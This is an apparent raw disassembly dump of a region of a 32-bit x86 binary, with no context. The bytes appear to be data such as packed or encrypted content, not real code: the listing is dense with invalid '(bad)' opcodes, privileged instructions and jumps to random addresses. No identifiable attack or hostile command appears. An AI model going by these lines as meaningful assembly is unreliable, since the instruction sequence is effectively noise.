  40ccaf:	sbb    al,0x4
  40ccb1:	pop    edi
  40ccb2:	mov    dl,0x22
  40ccb4:	jg     0x40cc9a
  40ccb6:	test   eax,0x6f57399a
  40ccbb:	dec    esp
  40ccbc:	pop    esi
  40ccbd:	add    BYTE PTR [ecx-0x1b],ch
  40ccc0:	cli    
  40ccc1:	out    0x8a,eax
  40ccc3:	xchg   ecx,eax
  40ccc4:	add    al,0x0
  40ccc6:	loop   0x40cc62
  40ccc8:	es or  al,0xf5
  40cccb:	and    cl,BYTE PTR [edx]
  40cccd:	lods   al,BYTE PTR ds:[esi]
  40ccce:	addr16 sahf 
  40ccd0:	add    dh,BYTE PTR [edx+edi*8+0x73]
  40ccd4:	fiadd  DWORD PTR [esp+edx*8+0x6f5f02dd]
  40ccdb:	and    al,0x32
  40ccdd:	ret    0xddf0
  40cce0:	jge    0x40cd27
	...
  40ccfa:	add    BYTE PTR [eax],al
  40ccfc:	popa   
  40ccfd:	les    esi,FWORD PTR [ebx-0xd]
  40cd00:	(bad)  
  40cd01:	rcl    DWORD PTR [eax+esi*8],1
  40cd04:	int    0x42
  40cd06:	add    BYTE PTR [edi+0x1c],ch
  40cd09:	fnstsw WORD PTR [ecx+0x0]
  40cd0c:	loopne 0x40cd10
  40cd0e:	push   esi
  40cd0f:	jg     0x40ccdf
  40cd11:	(bad)  
  40cd13:	out    dx,eax
  40cd14:	fild   WORD PTR [edx]
  40cd16:	test   BYTE PTR [ebp+eax*1+0x79cb0f5d],dh
  40cd1d:	pop    esi
  40cd1e:	add    BYTE PTR [edi+0x4],bh
  40cd21:	ins    BYTE PTR es:[edi],dx
  40cd22:	ret    
  40cd23:	out    0x3,eax
  40cd25:	cmp    ebx,edx
  40cd27:	add    cl,bh
  40cd29:	fadd   DWORD PTR [ebx-0xc]
  40cd2c:	xchg   DWORD PTR [eax+ebp*1],edi
  40cd2f:	clc    
  40cd30:	add    al,0x3d
  40cd32:	and    al,0xab
  40cd34:	pop    esi
  40cd35:	jmp    0xfd9dc197
  40cd3a:	add    al,0xf4
  40cd3c:	add    al,0x9e
  40cd3e:	push   edi
  40cd3f:	shr    al,1
  40cd41:	xchg   ebp,eax
  40cd42:	sbb    DWORD PTR [ebx],esp
  40cd44:	bnd call 0x6c45a93d
  40cd4a:	ret    
  40cd4b:	mov    BYTE PTR [edx],al
  40cd4d:	enter  0xc60a,0xc4
  40cd51:	add    DWORD PTR ds:0x320e0644,0x38e90136
  40cd5b:	jg     0x40cd35
  40cd5d:	mov    bh,0x34
	...
  40cd77:	add    BYTE PTR [edi+0x44],bh
  40cd7a:	in     eax,0xca
  40cd7c:	cmp    cl,cl
  40cd7e:	in     al,0x3
  40cd80:	hlt    
  40cd81:	add    al,0x6c
  40cd83:	ret    
  40cd84:	inc    edi
  40cd85:	and    ebx,edx
  40cd87:	add    edi,DWORD PTR [ecx+0x39]
  40cd8a:	xor    eax,0x31397134
  40cd8f:	xor    al,0x4e
  40cd91:	(bad)  
  40cd92:	mov    eax,0xf8fd08d2
  40cd97:	inc    ebx
  40cd98:	hlt    
  40cd99:	sub    DWORD PTR [eax],0x8b87f157
  40cd9f:	iret   
  40cda0:	not    DWORD PTR [ecx-0x12]
  40cda3:	jle    0x40cddd
  40cda5:	int    0x50
  40cda7:	or     al,BYTE PTR [eax]
  40cda9:	pop    es
  40cdaa:	add    BYTE PTR [edx+0xb826cb7],bh
  40cdb0:	out    dx,al
  40cdb1:	pop    es
  40cdb2:	ret    0x40a8
  40cdb5:	push   es
  40cdb6:	leave  
  40cdb7:	stos   BYTE PTR es:[edi],al
  40cdb8:	and    eax,DWORD PTR [eax-0x4c1ec515]
  40cdbe:	mov    ah,BYTE PTR [esi-0x390165c8]
  40cdc4:	and    eax,0xfc35d80e
  40cdc9:	push   ss
  40cdca:	rol    dl,0xfe
  40cdcd:	xor    dl,BYTE PTR [ebx-0x52]
  40cdd0:	mov    ds:0x17d0e7fc,eax
  40cdd5:	add    al,0x0
  40cdd7:	jb     0x40ce19
  40cdd9:	xor    ch,0x1c
	...
  40cdf4:	add    ah,ch
  40cdf6:	push   ss
  40cdf7:	rol    BYTE PTR [edx-0x18bc8649],0x24
  40cdfe:	jle    0x40cdcd
  40ce00:	ret    0x5627
  40ce03:	adc    al,0x63
  40ce05:	pop    es
  40ce06:	adc    DWORD PTR [edx+eiz*8+0x79],0xfffffffb
  40ce0b:	xchg   eax,edi
  40ce0d:	jno    0x40ce40
  40ce0f:	or     ebp,DWORD PTR [eax+0x1247fa6f]
  40ce15:	mov    al,ds:0xf7c3ec54
  40ce1a:	pop    esi
  40ce1b:	add    BYTE PTR [esi+0x2d],al
  40ce1e:	stc    
  40ce1f:	push   edx
  40ce20:	xchg   edi,eax
  40ce21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce22:	push   ebx
  40ce23:	add    al,0x36
  40ce25:	retf   
  40ce26:	push   es
  40ce27:	adc    BYTE PTR [ecx+0x265777f7],ch
  40ce2d:	int    0xaf
  40ce2f:	sbb    DWORD PTR [edx-0x12],eax
  40ce32:	retf   0x1c2
  40ce35:	dec    edx
  40ce36:	stos   BYTE PTR es:[edi],al
  40ce37:	add    cl,ch
  40ce39:	sbb    edi,eax
  40ce3b:	pop    ebp
  40ce3c:	add    BYTE PTR [esi+0x1b],dl
  40ce3f:	ret    0x9d04
  40ce42:	dec    ecx
  40ce43:	ror    BYTE PTR [ebx+0x10e8c5dc],0xb0
  40ce4a:	push   es
  40ce4b:	add    bh,bh
  40ce4d:	pop    ebp
  40ce4e:	leave  
  40ce4f:	ror    BYTE PTR [ebx+0xe087ac],0x4a
  40ce56:	push   es
  40ce57:	add    cl,al
	...
  40ce71:	add    BYTE PTR [esi+edx*8],ch
  40ce74:	or     ecx,edx
  40ce76:	pushf  
  40ce77:	scas   al,BYTE PTR es:[edi]
  40ce78:	push   es
  40ce79:	sar    DWORD PTR [edi],0xce
  40ce7c:	or     edx,eax
  40ce7e:	mov    ss,WORD PTR [ebx]
  40ce80:	mov    ebp,esp
  40ce82:	fiadd  WORD PTR [edi-0x29]
  40ce85:	mov    esp,DWORD PTR [esi]
  40ce87:	scas   al,BYTE PTR es:[edi]
  40ce88:	int    0xff
  40ce8a:	mov    dh,BYTE PTR [ebp+0x3fdf453b]
  40ce90:	push   eax
  40ce91:	je     0x40cea5
  40ce93:	icebp  
  40ce94:	mov    edi,0x721e9
  40ce99:	add    bl,ah
  40ce9b:	or     ecx,DWORD PTR [ebx+0xa28157d]
  40cea1:	pop    ecx
  40cea2:	xchg   esi,eax
  40cea3:	mov    al,0xf1
  40cea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea6:	or     WORD PTR [eax+ebp*8],ax
  40ceaa:	js     0x40ce60
  40ceac:	std    
  40cead:	call   DWORD PTR [esi+0x33]
  40ceb0:	or     BYTE PTR [ecx+0x4b8b0193],cl
  40ceb6:	lds    ebp,FWORD PTR [ebp-0x4af50063]
  40cebc:	xchg   DWORD PTR [esi-0x2b],eax
  40cebf:	add    al,0xb7
  40cec1:	dec    ebx
  40cec2:	cdq    
  40cec3:	dec    eax
  40cec4:	rol    cl,1
  40cec6:	pop    es
  40cec7:	into   
  40cec8:	mov    edi,0xfd7da5e1
  40cecd:	add    ah,dh
  40cecf:	fild   DWORD PTR [edx]
  40ced1:	and    eax,esp
  40ced3:	out    0xb1,al
  40ced5:	add    BYTE PTR gs:[eax],al
	...
  40ceec:	add    BYTE PTR [eax],al
  40ceee:	add    BYTE PTR [ebp+0x69],bh
  40cef1:	dec    BYTE PTR [esi]
  40cef3:	inc    ebx
  40cef4:	xchg   esi,eax
  40cef5:	repnz mov ah,BYTE PTR [ebp-0x28f822e4]
  40cefc:	jmp    0x40cebf
  40cefe:	loopne 0x40cefc
  40cf00:	(bad)  
  40cf01:	mov    bl,0x65
  40cf03:	jge    0x40cf16
  40cf05:	hlt    
  40cf06:	push   cs
  40cf07:	stos   DWORD PTR es:[edi],eax
  40cf08:	repnz mov al,BYTE PTR es:[ebp-0x64]
  40cf0d:	fld    DWORD PTR [edi]
  40cf0f:	pop    ss
  40cf10:	ins    BYTE PTR es:[edi],dx
  40cf11:	(bad)  
  40cf12:	loopne 0x40cf10
  40cf14:	(bad)  
  40cf15:	mov    bl,0x65
  40cf17:	ins    DWORD PTR es:[edi],dx
  40cf18:	jmp    0x26c3de0e
  40cf1d:	clc    
  40cf1e:	mov    al,BYTE PTR [ebp-0x64]
  40cf21:	fld    DWORD PTR [edi]
  40cf23:	xlat   BYTE PTR ds:[ebx]
  40cf24:	mov    eax,esp
  40cf26:	loopne 0x40cf14
  40cf28:	out    0xb3,al
  40cf2a:	gs ins DWORD PTR es:[edi],dx
  40cf2c:	adc    eax,edi
  40cf2e:	push   cs
  40cf2f:	dec    ebx
  40cf30:	push   ss
  40cf31:	test   BYTE PTR [edx+0x7d99c25],0xd7
  40cf38:	imul   eax,esp,0xffffffe0
  40cf3b:	in     al,dx
  40cf3c:	out    0xb3,al
  40cf3e:	gs jge 0x40cec9
  40cf41:	hlt    
  40cf42:	push   cs
  40cf43:	mov    ds:0xc58aea93,eax
  40cf48:	sbb    eax,0xe1707da
  40cf4d:	(bad)
  40cf50:	shl    BYTE PTR [ebx+0x65],cl
	...
  40cf6a:	add    BYTE PTR [eax],al
  40cf6c:	jge    0x40cfde
  40cf6e:	jmp    0xa58a:0xe8a38b0e
  40cf75:	sbb    eax,0x4d707da
  40cf7a:	cmp    ebp,eax
  40cf7c:	xchg   esp,eax
  40cf7d:	std    
  40cf7e:	icebp  
  40cf7f:	mov    ah,0x19
  40cf81:	jle    0x40cf41
  40cf83:	jmp    0xefe25f72
  40cf88:	jle    0x40cfb4
  40cf8a:	cmc    
  40cf8b:	jp     0x40cf31
  40cf8d:	(bad)  
  40cf8e:	adc    bh,ah
  40cf90:	(bad)  
  40cf91:	mov    ah,0x27
  40cf93:	in     eax,0xf3
  40cf95:	sti    
  40cf96:	pop    ss
  40cf97:	data16 jge 0x40cfc9
  40cf9a:	add    eax,0xe514e89
  40cf9f:	jnp    0x40cf81
  40cfa1:	hlt    
  40cfa2:	inc    edx
  40cfa3:	sti    
  40cfa4:	mov    esp,0x98d2d97b
  40cfa9:	jl     0x40cf9c
  40cfab:	fld    TBYTE PTR [edx]
  40cfad:	(bad)  
  40cfae:	mov    ebp,0xd9526ece
  40cfb3:	jl     0x40cfa6
  40cfb5:	jnp    0x40cfd8
  40cfb7:	or     BYTE PTR [ebx+esi*4],bl
  40cfba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfbb:	into   
  40cfbc:	sub    bh,BYTE PTR [esi+0x26]
  40cfbf:	or     BYTE PTR [edi+0x3c],ch
  40cfc2:	rcr    ebx,0x32
  40cfc5:	(bad)  
  40cfc6:	(bad)  
  40cfc7:	into   
  40cfc8:	jl     0x40d009
  40cfca:	sar    DWORD PTR [edx-0x80],1
  40cfcd:	cld    
  40cfce:	sbb    eax,0x7b
	...
  40cfe7:	add    BYTE PTR [eax],al
  40cfe9:	cmp    DWORD PTR [edi],esp
  40cfeb:	adc    dh,BYTE PTR [ecx]
  40cfed:	ss stc 
  40cfef:	call   0x68194f2c
  40cff4:	fist   WORD PTR [edi]
  40cff6:	add    ebp,ecx
  40cff8:	add    ecx,DWORD PTR [edx+0x7a]
  40cffb:	fwait
  40cffc:	jecxz  0x40cfd6
  40cffe:	(bad)  
  40cfff:	dec    ebp
  40d000:	fucomi st,st(1)
  40d002:	jbe    0x40cfec
  40d004:	add    edi,DWORD PTR [ecx-0x7f]
  40d007:	inc    esp
  40d008:	rol    dl,1
  40d00a:	(bad)  
  40d00b:	call   FWORD PTR [eax-0x9009de3]
  40d011:	iret   
  40d012:	fisttp DWORD PTR [ecx]
  40d014:	call   0x61005110
  40d019:	rol    DWORD PTR [eax+eax*1],0xe9
  40d01d:	push   ds
  40d01e:	ret    0xe274
  40d021:	mov    ecx,0xc8a9fec7
  40d026:	push   ecx
  40d027:	stc    
  40d028:	mov    ebx,0x2f43dab7
  40d02d:	test   DWORD PTR [eax+eax*2],0xe7cdcca0
  40d034:	pushf  
  40d035:	repnz add al,BYTE PTR [eax]
  40d038:	push   ebx
  40d039:	pop    esp
  40d03a:	fild   QWORD PTR [ebp+0x5004f5ef]
  40d040:	inc    ebx
  40d041:	fcmovb st,st(7)
  40d043:	ss sar edi,1
  40d046:	cli    
  40d047:	add    cl,ch
  40d049:	jnp    0x40cfd2
  40d04b:	jae    0x40cfdf
	...
  40d065:	add    BYTE PTR [ebx+0x5019d440],bh
  40d06b:	xor    eax,0x5ef7e911
  40d070:	sbb    DWORD PTR [esp+ebx*2],0xffffffc7
  40d074:	jb     0x40d06e
  40d076:	call   0xff5f:0xae39d440
  40d07d:	mov    esi,0xe8096f2f
  40d082:	test   DWORD PTR [eax-0x68920241],0xc3af0f00
  40d08c:	push   esp
  40d08d:	jb     0x40d063
  40d08f:	test   ebx,ebp
  40d091:	push   ecx
  40d092:	clc    
  40d093:	add    al,0x0
  40d095:	mov    edi,0xfa17f1a8
  40d09a:	aaa    
  40d09b:	add    eax,0x460d008b
  40d0a0:	inc    esp
  40d0a1:	hlt    
  40d0a2:	pop    ebp
  40d0a3:	rol    DWORD PTR [ebx-0xc],0xd5
  40d0a7:	add    al,BYTE PTR [eax]
  40d0a9:	add    dl,ah
  40d0ab:	int    0xba
  40d0ad:	adc    al,0x5d
  40d0af:	add    al,BYTE PTR [ebp-0x75007640]
  40d0b5:	(bad)  
  40d0b6:	mov    dh,0x3f
  40d0b8:	clc    
  40d0b9:	mov    DWORD PTR [eax-0x46],ebx
  40d0bc:	xchg   DWORD PTR [ebp-0x8],eax
  40d0bf:	inc    ebp
  40d0c0:	inc    esp
  40d0c1:	rcr    BYTE PTR [ebp-0x40],1
  40d0c4:	inc    ebx
  40d0c5:	loopne 0x40d053
  40d0c7:	dec    ebx
  40d0c8:	je     0x40d0ab
	...
  40d0e2:	add    BYTE PTR [edx-0x31],ah
  40d0e5:	ret    0x1d11
  40d0e8:	add    DWORD PTR [ebp-0x17ed62bb],ecx
  40d0ee:	bound  eax,QWORD PTR fs:[eax+eax*1]
  40d0f2:	mov    DWORD PTR [eax],ebx
  40d0f4:	stos   BYTE PTR es:[edi],al
  40d0f5:	mov    eax,DWORD PTR [ebp-0x246af]
  40d0fb:	fnsave [edi+0x421cc013]
  40d101:	add    BYTE PTR [ebx-0x22a68],cl
  40d107:	push   edx
  40d108:	sub    eax,0x3ea4c4c0
  40d10d:	in     eax,dx
  40d10e:	push   0x1c
  40d110:	inc    edi
  40d111:	inc    esp
  40d112:	loopne 0x40d0e1
  40d114:	dec    ebx
  40d115:	inc    esp
  40d116:	or     bh,ah
  40d118:	sub    edi,edi
  40d11a:	xor    BYTE PTR [ebp+0x4f],ah
  40d11d:	or     BYTE PTR [ecx],al
  40d11f:	or     eax,0xd9c2c918
  40d124:	add    DWORD PTR [ebp-0x75],edx
  40d127:	inc    ecx
  40d128:	test   edx,ebp
  40d12a:	adc    BYTE PTR [edx-0xb95ded5],ch
  40d130:	(bad)  [edi+edi*8]
  40d133:	jmp    0xf480c5c3
  40d138:	pop    edx
  40d139:	(bad)  
  40d13a:	or     ecx,DWORD PTR [esi-0x4]
  40d13d:	sub    esp,DWORD PTR [esi+0x6d]
  40d140:	xchg   ebp,eax
  40d141:	add    DWORD PTR [ebp-0x39ccf3c7],ecx
	...
  40d15f:	add    dl,dh
  40d161:	(bad)  
  40d163:	loopne 0x40d169
  40d165:	fadd   QWORD PTR [edx]
  40d167:	outs   dx,WORD PTR ds:[esi]
  40d169:	cwde   
  40d16a:	shl    BYTE PTR [ebp+0x7d],cl
  40d16d:	popf   
  40d16e:	add    eax,0xd0987f66
  40d173:	gs ins DWORD PTR es:[edi],dx
  40d175:	popf   
  40d176:	add    ecx,DWORD PTR [ebp-0x17ce2fcf]
  40d17c:	test   BYTE PTR [edi-0x2154fffe],ch
  40d182:	retf   0x63ff
  40d185:	pusha  
  40d186:	les    esi,FWORD PTR [ebx+0x6]
  40d189:	arpl   WORD PTR [ecx],di
  40d18b:	cld    
  40d18c:	packuswb mm7,mm2
  40d18f:	inc    esi
  40d190:	cmp    ebp,ebx
  40d192:	popa   
  40d193:	mov    DWORD PTR [edx+0x18c4dad4],esi
  40d199:	fadd   QWORD PTR [edx]
  40d19b:	lea    edi,[ecx+0x3fe83397]
  40d1a1:	retf   0x2
  40d1a4:	jns    0x40d141
  40d1a6:	dec    edi
  40d1a7:	adc    ch,BYTE PTR [edi+0x20]
  40d1aa:	enter  0x433a,0xa6
  40d1ae:	inc    ecx
  40d1af:	iret   
  40d1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1b1:	cmc    
  40d1b2:	jl     0x40d201
  40d1b4:	out    dx,eax
  40d1b5:	jae    0x40d158
  40d1b7:	fcomi  st,st(5)
  40d1b9:	(bad)  [edi+0x44]
  40d1bc:	lock push ds
  40d1be:	fcom   QWORD PTR [edx]
  40d1c0:	pop    es
  40d1c1:	add    eax,0x3e9
	...
  40d1da:	add    BYTE PTR [eax],al
  40d1dc:	add    BYTE PTR [ecx-0x3b],bh
  40d1df:	aam    0xf4
  40d1e1:	sbb    al,0x42
  40d1e3:	push   ebp
  40d1e4:	xor    al,0x3
  40d1e6:	dec    ebx
  40d1e7:	int3   
  40d1e8:	(bad)  
  40d1e9:	push   ecx
  40d1ea:	mov    es,esi
  40d1ec:	clc    
  40d1ed:	fisttp DWORD PTR [ebp-0x6e0bfae4]
  40d1f3:	stos   DWORD PTR es:[edi],eax
  40d1f4:	mov    DWORD PTR [ebx+0x2d],0x4f40451
  40d1fb:	adc    DWORD PTR [eax-0xe],edx
  40d1fe:	add    al,0xe9
  40d200:	sub    dh,BYTE PTR [ecx-0x3b]
  40d203:	pushf  
  40d204:	hlt    
  40d205:	jbe    0x40d249
  40d207:	or     eax,0x8f0a0614
  40d20c:	xchg   BYTE PTR [ecx],dh
  40d20e:	or     al,ch
  40d210:	xor    ecx,DWORD PTR [ecx+ebp*1-0x320bfaeb]
  40d217:	sub    DWORD PTR [ecx],esi
  40d219:	jg     0x40d1cc
  40d21b:	xlat   BYTE PTR ds:[bx]
  40d21d:	retf   
  40d21e:	push   es
  40d21f:	jmp    0x3e9b9927
  40d224:	(bad)  
  40d225:	test   DWORD PTR ds:0x91a703e9,0xc440976b
  40d22f:	mov    ebp,0xb604ce33
  40d234:	lock sbb edx,DWORD PTR [edi]
  40d237:	sub    DWORD PTR [edi+edi*2],eax
  40d23a:	add    bh,BYTE PTR [ecx]
  40d23c:	repnz jecxz 0x40d243
  40d23f:	jo     0x40d281
	...
  40d259:	add    BYTE PTR [edx+ecx*4],bl
  40d25c:	test   al,0x4f
  40d25e:	out    0x91,eax
  40d260:	pop    ebx
  40d261:	xchg   edi,eax
  40d262:	or     ah,al
  40d264:	test   DWORD PTR [ecx+esi*2],esi
  40d267:	cmp    dl,BYTE PTR [ebp-0x2eb225]
  40d26d:	out    0xf7,eax
  40d26f:	mov    BYTE PTR [edi+0xc2decf4],bh
  40d275:	je     0x40d2ab
  40d277:	fldcw  WORD PTR [ecx-0x17]
  40d27a:	daa    
  40d27b:	(bad)  
  40d27c:	(bad)  
  40d27d:	push   0xffffff93
  40d27f:	ud0    esi,esp
  40d282:	not    DWORD PTR [edi]
  40d284:	inc    eax
  40d285:	jmp    0x3e9686cc
  40d28a:	(bad)
  40d28e:	idiv   DWORD PTR [ebp+0x2]
  40d291:	call   0x287bd78d
  40d296:	in     eax,0x91
  40d298:	je     0x40d2a7
  40d29a:	sahf   
  40d29b:	push   eax
  40d29c:	rol    DWORD PTR [ecx],0x26
  40d29f:	rol    DWORD PTR [eax],1
  40d2a1:	jmp    0xf5b556b1
  40d2a6:	and    DWORD PTR [ecx],edx
  40d2a8:	mov    esp,DWORD PTR [edi]
  40d2aa:	sbb    DWORD PTR ds:0x86a5f650,eax
  40d2b0:	ret    
  40d2b1:	fucomp st(4)
  40d2b3:	dec    eax
  40d2b4:	clc    
  40d2b5:	cmp    ebx,ebp
  40d2b7:	mov    BYTE PTR [ebx+0x4fc22ddc],ch
  40d2bd:	inc    ebx
	...
  40d2d6:	add    dl,bh
  40d2d8:	lea    ebx,[ecx+edx*8+0x3d]
  40d2dc:	sbb    al,dl
  40d2de:	fidiv  DWORD PTR [edi-0x5b567bfc]
  40d2e4:	sbb    cl,BYTE PTR [ebp-0x13f7394]
  40d2ea:	scas   al,BYTE PTR es:[edi]
  40d2eb:	loopne 0x40d27c
  40d2ed:	inc    esp
  40d2ee:	mov    eax,ds:0x91e038ab
  40d2f3:	jmp    0x9429d3c8
  40d2f8:	xor    DWORD PTR [esp+ebx*8-0x57],0x10
  40d2fd:	lea    eax,[eax]
  40d2ff:	shr    BYTE PTR [eax-0x3222ff98],1
  40d305:	aad    0x83
  40d307:	mov    eax,ds:0x89458bbd
  40d30c:	stc    
  40d30d:	mov    WORD PTR [ebp+0x11],es
  40d310:	stc    
  40d311:	mov    WORD PTR [ebp+0x79],es
  40d314:	stc    
  40d315:	mov    WORD PTR [ebp+0x71],es
  40d318:	stc    
  40d319:	imul   edi,edi,0x12eab23a
  40d31f:	lea    eax,[esi]
  40d321:	test   eax,eax
  40d323:	add    dl,0x31
  40d326:	div    BYTE PTR [esi]
  40d328:	out    0x8a,al
  40d32a:	inc    ebp
  40d32b:	and    DWORD PTR [eax+0x4c],eax
  40d32e:	mov    eax,0x50687
  40d333:	or     eax,0x1d6828c6
  40d338:	aaa    
  40d339:	xchg   edi,eax
	...
  40d352:	add    BYTE PTR [eax],al
  40d354:	sbb    al,0x76
  40d356:	pop    ds
  40d357:	dec    esi
  40d358:	outs   dx,DWORD PTR ds:[esi]
  40d359:	int3   
  40d35a:	dec    edi
  40d35b:	push   eax
  40d35c:	in     eax,0x4b
  40d35e:	into   
  40d35f:	add    bl,BYTE PTR [ebp+0x41]
  40d362:	out    dx,eax
  40d363:	mov    ecx,DWORD PTR [eax+0x414d01de]
  40d369:	inc    ecx
  40d36a:	inc    esp
  40d36b:	fmul   st(0),st
  40d36d:	jmp    0xeb14e572
  40d372:	test   DWORD PTR [ebp+0x33075386],0x85df3a
  40d37c:	dec    ebp
  40d37d:	push   es
  40d37e:	mov    eax,ebx
  40d380:	xor    eax,0x1d01d9bd
  40d385:	inc    ecx
  40d386:	test   DWORD PTR [ebp-0x3985ada6],0x94a10712
  40d390:	hlt    
  40d391:	lea    eax,[ebx+0x0]
  40d394:	jge    0x40d381
  40d396:	add    ah,BYTE PTR [eax+0x438e64]
  40d39c:	imul   esp,DWORD PTR [ebx],0xb13b87f6
  40d3a2:	(bad)  
  40d3a3:	adc    al,0xcc
  40d3a5:	fld    QWORD PTR [edx+0x0]
  40d3a8:	pop    edx
  40d3a9:	xor    eax,0xda6d0640
  40d3ae:	cli    
  40d3af:	gs jg  0x40d422
  40d3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3b3:	mov    al,BYTE PTR [ecx]
  40d3b5:	mov    al,ds:0x3ff0
	...
  40d3ce:	add    BYTE PTR [eax],al
  40d3d0:	add    ah,dh
  40d3d2:	sar    DWORD PTR [ecx+0x46],1
  40d3d5:	call   0xa8854fa3
  40d3da:	sar    DWORD PTR [ecx+0x46],1
  40d3dd:	cli    
  40d3de:	leave  
  40d3df:	jnp    0x40d425
  40d3e1:	mov    WORD PTR [ecx-0x4cfbb987],ss
  40d3e7:	pop    DWORD PTR [esi+0x0]
  40d3ea:	jl     0x40d3b3
  40d3ec:	je     0x40d38e
  40d3ee:	jle    0x40d3b7
  40d3f0:	aad    0xf3
  40d3f2:	add    al,BYTE PTR [eax+0xc]
  40d3f5:	mul    ebx
  40d3f7:	div    DWORD PTR [esi-0x3c7c5645]
  40d3fd:	clc    
  40d3fe:	fwait
  40d3ff:	(bad)  
  40d400:	je     0x40d452
  40d402:	inc    dh
  40d404:	aad    0xeb
  40d406:	call   0x4ff7:0x6f77103e
  40d40d:	sti    
  40d40e:	call   0x2e4:0x430e3e
  40d415:	aaa    
  40d416:	sbb    eax,edi
  40d418:	aad    0x7f
  40d41a:	sbb    ah,cl
  40d41c:	xor    BYTE PTR [eax],0xdf
  40d41f:	ja     0x40d495
  40d421:	dec    eax
  40d422:	add    al,0x91
  40d424:	pop    ss
  40d425:	das    
  40d426:	add    ebp,ecx
  40d428:	js     0x40d3b2
  40d42a:	mov    al,0x80
  40d42c:	pop    ds
  40d42d:	aas    
  40d42e:	add    ebp,ecx
  40d430:	js     0x40d3ba
  40d432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d433:	nop
  40d434:	out    0x0,eax
	...
  40d44e:	cs add ebp,ecx
  40d451:	jp     0x40d48b
  40d453:	or     eax,0xc87eec60
  40d458:	or     eax,0x2ace3f26
  40d45d:	add    ah,dh
  40d45f:	push   ebx
  40d460:	mov    ah,0x2e
  40d462:	mov    edx,0xb4dbe807
  40d467:	sbb    eax,0xf26f03eb
  40d46c:	loopne 0x40d45f
  40d46e:	sti    
  40d46f:	add    al,0xfa
  40d471:	stos   BYTE PTR es:[edi],al
  40d472:	jnp    0x40d4bb
  40d474:	call   0xaa1fc7ff
  40d479:	add    ebx,esp
  40d47b:	and    DWORD PTR [ecx],esp
  40d47d:	test   eax,0x1b940536
  40d482:	sub    eax,eax
  40d484:	cmp    ecx,DWORD PTR [ecx+ebp*8]
  40d487:	mov    esp,0x39f4432b
  40d48c:	(bad)  
  40d48e:	lds    edx,FWORD PTR [edi]
  40d490:	jmp    0x40d495
  40d492:	js     0x40d459
  40d494:	jl     0x40d48e
  40d496:	jl     0x40d4ba
  40d498:	in     eax,dx
  40d499:	test   al,0xb6
  40d49b:	add    al,0xaf
  40d49d:	add    BYTE PTR [edx+eiz*8+0x29],bl
  40d4a1:	add    al,0xf5
  40d4a3:	push   edi
  40d4a4:	(bad)  
  40d4a5:	lock out dx,eax
  40d4a7:	adc    ch,BYTE PTR [ecx]
  40d4a9:	add    al,0xda
  40d4ab:	gs mov edx,0x4704b6a9
  40d4b1:	jge    0x40d4b3
	...
  40d4cb:	mov    ecx,0x79c10002
  40d4d0:	sbb    BYTE PTR [edx],al
  40d4d2:	jmp    0xe1451e76
  40d4d7:	or     al,0xb8
  40d4d9:	fsubr  QWORD PTR [edx]
  40d4db:	clc    
  40d4dc:	cmp    DWORD PTR [eax],ebp
  40d4de:	ds xor ebx,ecx
  40d4e1:	aaa    
  40d4e2:	in     al,dx
  40d4e3:	das    
  40d4e4:	loope  0x40d528
  40d4e6:	jmp    0x7a28eb8f
  40d4eb:	loope  0x40d4f2
  40d4ed:	add    BYTE PTR [ebp-0x49],ch
  40d4f0:	xor    ecx,DWORD PTR ds:0xdcbbcc60
  40d4f6:	stos   BYTE PTR es:[edi],al
  40d4f7:	test   esi,0x429c6104
  40d4fd:	add    al,ch
  40d4ff:	sbb    al,al
  40d501:	adc    al,0xed
  40d503:	(bad)  
  40d506:	into   
  40d507:	nop
  40d508:	mov    ecx,0x26f7aad9
  40d50d:	mov    DWORD PTR [edi-0x2e48530c],ebp
  40d513:	cmc    
  40d514:	add    al,0x89
  40d516:	scas   eax,DWORD PTR es:[edi]
  40d517:	call   0xffff:0x851514be
  40d51e:	mov    ch,0xdc
  40d520:	mov    DWORD PTR es:[edi-0x633ca582],esp
  40d527:	(bad)  
  40d528:	stos   DWORD PTR es:[edi],eax
  40d529:	add    BYTE PTR ds:0x5deb843f,0x0
	...
  40d548:	cmc    
  40d549:	add    al,0x0
  40d54b:	call   0x1547:0xfcff5811
  40d552:	inc    eax
  40d553:	jmp    0x2dc9b13c
  40d558:	adc    al,0xf9
  40d55a:	cmp    ch,BYTE PTR [edx+0x3307b3]
  40d560:	(bad)  
  40d561:	fstp   TBYTE PTR [ecx]
  40d563:	add    bl,BYTE PTR ds:0x1cda6803
  40d569:	add    eax,DWORD PTR [eax]
  40d56b:	push   0x15
  40d56d:	enter  0xd833,0x5b
  40d571:	inc    ebp
  40d572:	add    bh,al
  40d574:	ftst   
  40d576:	pop    ds
  40d577:	add    bl,BYTE PTR ds:0x8ff0003
  40d57d:	pop    ds
  40d57e:	adc    DWORD PTR [eax+0xd],eax
  40d581:	cmp    al,0xf7
  40d583:	cmp    esi,DWORD PTR [esi+0x55]
  40d586:	fmul   DWORD PTR [ebp+0x8fe559]
  40d58c:	int    0x2
  40d58e:	push   eax
  40d58f:	push   ebx
  40d590:	sahf   
  40d591:	pop    edx
  40d592:	and    al,0x60
  40d594:	fld    QWORD PTR [edx]
  40d596:	push   ebx
  40d597:	(bad)  
  40d598:	fiadd  DWORD PTR [ebx]
  40d59a:	mov    DWORD PTR [ecx+edi*8+0x1c],ebx
  40d59e:	call   DWORD PTR ds:0x3eb595
  40d5a4:	sbb    cl,cl
  40d5a6:	jae    0x40d5ba
  40d5a8:	adc    BYTE PTR [ebp+0x9022],al
	...
  40d5c2:	add    BYTE PTR [eax],al
  40d5c4:	add    BYTE PTR [ebp-0x2daffffe],cl
  40d5ca:	lods   eax,DWORD PTR ds:[esi]
  40d5cb:	(bad)  
  40d5cc:	adc    ebx,DWORD PTR [ebp+0x2]
  40d5cf:	mov    DWORD PTR [ecx+edi*4-0x56],eax
  40d5d3:	data16 rcr BYTE PTR [esi+0x42],1
  40d5d7:	add    BYTE PTR [ebp+0x50221e49],cl
  40d5dd:	jb     0x40d58e
  40d5df:	into   
  40d5e0:	adc    bl,BYTE PTR [ebp+0x39748d02]
  40d5e6:	cli    
  40d5e7:	mov    bh,0x9c
  40d5e9:	dec    ebp
  40d5ea:	add    al,BYTE PTR [eax]
  40d5ec:	call   0x41bf69
  40d5f1:	hlt    
